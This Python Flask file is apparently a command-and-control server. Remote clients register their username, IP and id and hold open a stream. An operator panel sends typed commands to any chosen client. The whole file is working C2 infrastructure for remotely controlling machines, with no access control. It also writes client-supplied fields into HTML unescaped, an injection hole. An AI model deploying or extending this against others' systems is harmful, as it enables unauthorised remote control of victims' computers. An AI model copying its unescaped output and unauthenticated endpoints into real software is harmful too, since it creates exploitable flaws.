from flask import Flask, request, jsonify, Response, redirect
from time import sleep
from threading import Thread

app = Flask(__name__)


class Client():
    def __init__(self, data):
        self.data = data
        self.new_command = False
        self.is_alive = True

clients = []

@app.route("/")
def index():
    return "Hello world"

@app.route("/client-command")
def send_command():
    id = int(request.args.get("client-id"))
    command = request.args.get("command")
    for client in clients:
        if client.data["id"] == id:
            client.new_command = command
            break
    return redirect("/clients")

def client_template(client):
    return f"""
    <div>
    <h1>{client.data["username"]}</h1>
    <h5>ID: {client.data["id"]}</h5>
    <h5>IP: {client.data["ip"]}</h5>
    <label for="command">Command</label>
    <input type="text" id="command{client.data["id"]}"/>
    <button onclick="location.href='/client-command?client-id={client.data["id"]}&command=' 
    + document.getElementById('command{client.data["id"]}').value" type="button">Submit</button>
    </div>
    """
@app.route("/clients-len")
def clients_len():
    return str(len(clients))

@app.route("/clients")
def view_clients():
    return f"""
    <html>
    <head>
    <title>Clients</title>
    </head>
    <body>
    <h1>Clients<h1>
    <br/>""" + "\n".join(client_template(client) for client in clients) + """
    <script>
    let i = 0;
    let last_len = 0;
    let fetchRes = fetch(
    "/clients-len");
    fetchRes.then(res =>
        res.json()).then(d => {
            last_len = d;
        })
    
    setInterval(function () {
    
    if (i == 4){
    let fetchRes = fetch(
    "/clients-len");
    fetchRes.then(res =>
        res.json()).then(d => {
            if (d != last_len){
                location.reload();
            }
        })
    }
        i = i + 1;
        if (i >= 5) i = 0;
    }, 600);
    </script>
    </body>
    </html>
    """

@app.route("/connect", methods=['POST'])
def connect():
    data = request.get_json()
    client = Client(data)
    clients.append(client)

    def generate():
        while True:
            client.is_alive = True
            if client.new_command == False:
                yield "null\n"
            else:
                yield client.new_command
                client.new_command = False
    
    response = Response(generate(), mimetype='text/plain')
    @response.call_on_close
    def close_conn():
        clients.remove(client)

    return response


def check_clients():
    while True:
        for client in clients:
            if client.is_alive == False:
                clients.remove(client)
            else:
                client.is_alive = False
        sleep(3)

t = Thread(target=check_clients)
t.start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8888)